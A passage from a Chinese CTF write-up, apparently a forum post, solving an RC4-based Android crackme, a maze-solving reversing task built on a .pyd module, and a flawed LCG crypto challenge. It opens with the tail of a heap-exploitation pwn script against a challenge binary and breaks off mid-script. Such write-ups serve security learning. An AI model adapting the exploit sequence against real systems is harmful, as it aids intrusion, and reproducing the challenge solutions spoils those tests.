punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xa7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xa6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x8f</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x77</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x6f</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x6e</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''edit(0,tmp[:0x6f])edit(0,tmp[:0x6e])edit(0,tmp[:0x67])edit(0,tmp[:0x66])for i in range(0x6):    edit(0,tmp[:0x5f-i])for i in range(0x16):    edit(0,tmp[:0x48-i])for i in range(0x3):    edit(0,tmp[:0x31-i])for i in range(0x24):    edit(0,tmp[:0x24-i])'''</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ti<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="re1-crackme2-apk1"><a class="header-anchor" href="#re1-crackme2-apk1">¶</a>re1_crackme2_apk1</h3><p>这题老早就出了，有个函数用自己的了，和题目有点区别，导致flag一直不对，后面过了好久才反应过来，痛失一血。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b0b096768b028daddb86db220d88a65a860854a1.png" alt="图片.png"></p><p>encode函数</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-392b97a055c674c08bce2ff0307b0d5cf86adbf3.png" alt="图片.png"><br>明显的RC4特征，直接跑存好的脚本</p><figure><div class="code-wrapper"><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import base64def rc4_main(key &#x3D; &quot;init_key&quot;, message &#x3D; &quot;init_message&quot;):    print(&quot;RC4解密主函数调用成功&quot;)    print(&#39;\n&#39;)    s_box &#x3D; rc4_init_sbox(key)    crypt &#x3D; rc4_excrypt(message, s_box)    return crypt    def rc4_init_sbox(key):    s_box &#x3D; list(range(256))     print(&quot;原来的 s 盒：%s&quot; % s_box)    print(&#39;\n&#39;)    j &#x3D; 0    for i in range(256):        j &#x3D; (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] &#x3D; s_box[j], s_box[i]    print(&quot;混乱后的 s 盒：%s&quot;% s_box)    print(&#39;\n&#39;)    return s_box    def rc4_excrypt(plain, box):    print(&quot;调用解密程序成功。&quot;)    print(&#39;\n&#39;)    plain &#x3D; base64.b64decode(plain.encode(&#39;utf-8&#39;))    plain &#x3D; bytes.decode(plain)    res &#x3D; []    i &#x3D; j &#x3D; 0    for s in plain:        i &#x3D; (i + 1) % 256        j &#x3D; (j + box[i] + 136) % 256        box[i], box[j] &#x3D; box[j], box[i]        t &#x3D; (box[i] + box[j]) % 256        k &#x3D; box[t]        res.append(chr(ord(s) ^ k))    print(&quot;res用于解密字符串，解密后是：%res&quot; %res)    print(&#39;\n&#39;)    cipher &#x3D; &quot;&quot;.join(res)    print(&quot;解密后的字符串是：%s&quot; %cipher)    print(&#39;\n&#39;)    print(&quot;解密后的输出(没经过任何编码):&quot;)    print(&#39;\n&#39;)    return  cipher# # target &#x3D; [205, &#39;R&#39;, &#39;t&#39;, &#39;z&#39;, 30, &#39;\b&#39;, &#39;\b&#39;, 224, &#39;W&#39;, &#39;;&#39;, 24, 153, 175, &#39;&#x3D;&#39;, 29, 148, 21, &#39;%&#39;, &#39;g&#39;, &#39;[&#39;, &#39;d&#39;, &#39;S&#39;, 31, &#39;;&#39;, 220, 162, &#39;F&#39;, &#39;6&#39;, 211, 253, 190, &#39;3&#39;]# target &#x3D; [205, 82,  116, 122, 30,  8,     8,  224,  87, 59,  24, 153, 175, 61,  29, 148, 21, 37,   103, 91, 100,  83, 31, 59,  220, 162, 70,  54,  211, 253, 190, 51]# for i in range(len(target)):#     print(hex(target[i]))# print(target)0xcd,0x52,0x74,0x7a,0x1e,0x8,0x8,0xe0,0x57,0x3b,0x18,0x99,0xaf,0x3d,0x1d,0x94,0x15,0x25,0x67,0x5b,0x64,0x53,0x1f,0x3b,0xdc,0xa2,0x46,0x36,0xd3,0xfd,0xbe,0x33a&#x3D;[0xcd,0x52,0x74,0x7a,0x1e,0x8,0x8,0xe0,0x57,0x3b,0x18,0x99,0xaf,0x3d,0x1d,0x94,0x15,0x25,0x67,0x5b,0x64,0x53,0x1f,0x3b,0xdc,0xa2,0x46,0x36,0xd3,0xfd,0xbe,0x33]s&#x3D;&quot;&quot;for i in a:    s+&#x3D;chr(i)s&#x3D;str(base64.b64encode(s.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;)rc4_main(&quot;happygame&quot;, s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="re3-meikyu2"><a class="header-anchor" href="#re3-meikyu2">¶</a>re3_meikyu2</h3><p>是个python文件，<a href="http://xn--main-kf5f3se02y.py">给了个main.py</a> 一个data 一个dll 和pyd文件。讲真第一次看见pyd，逻辑不难懂。</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mylib<span class="token punctuation">.</span>pyd<span class="token keyword">from</span> mylib<span class="token punctuation">.</span>pyd <span class="token keyword">import</span> CheckStatus <span class="token keyword">as</span> CS<span class="token punctuation">,</span> START<span class="token punctuation">,</span> END<span class="token punctuation">,</span> WALL<span class="token punctuation">,</span> ROAD<span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing file: data'</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        map_ <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">b'suta-to'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>map_<span class="token punctuation">)</span><span class="token punctuation">:</span>        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ch <span class="token operator">^</span> cipher<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>START<span class="token punctuation">,</span> END<span class="token punctuation">,</span> WALL<span class="token punctuation">,</span> ROAD<span class="token punctuation">)</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Input key:'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">match</span> mylib<span class="token punctuation">.</span>check<span class="token punctuation">(</span>map_<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>FAIL<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong key'</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Congratulations!!! Your flag is: `flag&#123;md5(key)&#125;`'</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> CS<span class="token punctuation">.</span>ERROR_CIPHER_LEN <span class="token operator">|</span> CS<span class="token punctuation">.</span>ERROR_DATA_LEN <span class="token operator">|</span> CS<span class="token punctuation">.</span>ERROR_FMT <span class="token operator">|</span> CS<span class="token punctuation">.</span>FATAL_ERROR<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Something wrong, can you figure out?'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Bye~'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>网上导入pyd的方式都试过了，没办法成功导入这个mylib。所以对其中的一些函数只能ida逆向，而不太能调试分析。<br>答题的流程是制作一个map，然后用check函数检查。<br>题目给了提示是深度优先算法。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d99fa8c6867f6465e6ebe8bfc9054111af65dce7.png" alt="图片.png"></p><p>101*101的迷宫。<br>尝试恢复迷宫</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># import mylib</span><span class="token comment"># from mylib import CheckStatus as CS, START, END, WALL, ROAD</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing file: data'</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                map_ <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">b'suta-to'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>map_<span class="token punctuation">)</span><span class="token punctuation">:</span>                map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ch <span class="token operator">^</span> cipher<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">]</span>                <span class="token keyword">if</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">83</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'S'</span>                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">35</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0'</span>                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'1'</span>                <span class="token keyword">elif</span> map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">69</span><span class="token punctuation">:</span>                        map_<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'X'</span>                <span class="token comment"># if map_[i] not in (START, END, WALL, ROAD):</span>                <span class="token comment">#         exit(0)</span>        <span class="token comment"># print(map_)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>map_<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">101</span><span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        <span class="token comment">#print(map_)</span>        <span class="token comment"># key = input('Input key:').encode()</span>        <span class="token comment"># match mylib.check(map_, list(key)):</span>        <span class="token comment">#         case CS.FAIL:</span>        <span class="token comment">#                 print('Wrong key')</span>        <span class="token comment">#         case CS.SUCCESS:</span>        <span class="token comment">#                 print('Congratulations!!! Your flag is: `flag&#123;md5(key)&#125;`')</span>        <span class="token comment">#         case CS.ERROR_CIPHER_LEN | CS.ERROR_DATA_LEN | CS.ERROR_FMT | CS.FATAL_ERROR:</span>        <span class="token comment">#                 print('Something wrong, can you figure out?')</span>        <span class="token comment"># print('Bye~')</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>真的血亏，这里</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fcb1cbf827d5de3bd60ccc30fdd49a51f3322b94.png" alt="图片.png"><br>当时写了i*100，不仅没拿到二血，还没做出来。。。。。</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-nonespan aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后写个深度优先的脚本就可以解出来了。。</p><figure><div class="code-wrapper"><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include&lt;iostream&gt;#include&lt;cstdio&gt;#include&lt;cstring&gt;using namespace std;int x1[]&#x3D;&#123;1,0,-1,0&#125;,    y1[]&#x3D;&#123;0,1,0,-1&#125;;char w[] &#x3D; &#123;&#39;s&#39;,&#39;d&#39;,&#39;w&#39;,&#39;a&#39;&#125;;char f[103][103];char leng[500];int flag &#x3D; 0;bool vis[103][103];int n&#x3D;101;void dfs(int x,int y,int len)&#123;        vis[x][y] &#x3D; 1;        if(flag &#x3D;&#x3D; 1)        return;        if(f[x][y] &#x3D;&#x3D; &#39;2&#39;)        &#123;                for(int j &#x3D; 0;j&lt;&#x3D;len;++j)                cout&lt;&lt;leng[j];                flag &#x3D; 1;                cout&lt;&lt;endl;                return;         &#125;        for(int i &#x3D; 0;i&lt;4;++i)        &#123;                int nx &#x3D; x+x1[i];                int ny &#x3D; y+y1[i];                if(nx&lt;0||ny&lt;0||nx&gt;&#x3D;n||ny&gt;&#x3D;n||vis[nx][ny] &#x3D;&#x3D; 1)                continue;                if(f[nx][ny] &#x3D;&#x3D; &#39;0&#39;)                continue;                leng[len] &#x3D; w[i];                dfs(nx,ny,len+1);                vis[nx][ny] &#x3D; 0;        &#125; &#125;int main() &#123;                for(int i &#x3D; 0;i&lt;n;++i)         for(int j &#x3D; 0;j&lt;n;++j)                 cin&gt;&gt;f[i][j];        dfs(1,0,0); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>md5之后就是flag</p><h3 id="密码1-LCG"><a class="header-anchor" href="#密码1-LCG">¶</a>密码1 LCG</h3><p>这个题看走眼，也是题目有点问题。</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">LCG</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>b <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>c <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>seed <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>seed <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n            <span class="token keyword">return</span> self<span class="token punctuation">.</span>seed                 <span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b = &#123;&#125;\nn = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>b<span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"seed = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        lcg <span class="token operator">=</span> LCG<span class="token punctuation">(</span><span class="token punctuation">)</span>            lcg<span class="token punctuation">.</span>output<span class="token punctuation">(</span><span class="token punctuation">)</span>            c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>            c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token triple-quoted-string string">'''            b = 3831416627            n = 2273386207            seed = 2403188683            s1 = 260742417            s2 = 447908860            c1 = 17275            c2 = 28951            '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>通过seed，s1,s2先算出lcg的a和c<br>这里通过c1,c2的计算是有些歧义的，最后的正解是c1是没有右移带入c2的运算的，不然按照原来代码是求不出flag的，当然这也导致了一波人解不出来,这里还需要注意最后的flag是32位，flag需要加个n</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2b <span class="token operator">=</span> <span class="token number">3831416627</span>n <span class="token operator">=</span> <span class="token number">2273386207</span>seed <span class="token operator">=</span> <span class="token number">2403188683</span>s1 <span class="token operator">=</span> <span class="token number">260742417</span>s2 <span class="token operator">=</span> <span class="token number">447908860</span>c1 <span class="token operator">=</span> <span class="token number">17275</span>c2 <span class="token operator">=</span> <span class="token number">28951</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s2<span class="token operator">-</span>s1<span class="token punctuation">)</span><span class="token operator">-</span>b<span class="token operator">*</span><span class="token punctuation">(</span>s1<span class="token operator">-</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>seed<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>nc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token operator">*</span>s1<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">-</span> b<span class="token operator">*</span>s1 <span class="token operator">+</span> s2<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c11 <span class="token operator">=</span> <span class="token punctuation">(</span>c1<span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> i    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c11<span class="token operator">*</span>a<span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">==</span> c2<span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c11<span class="token operator">-</span>c<span class="token punctuation">)</span><span class="token 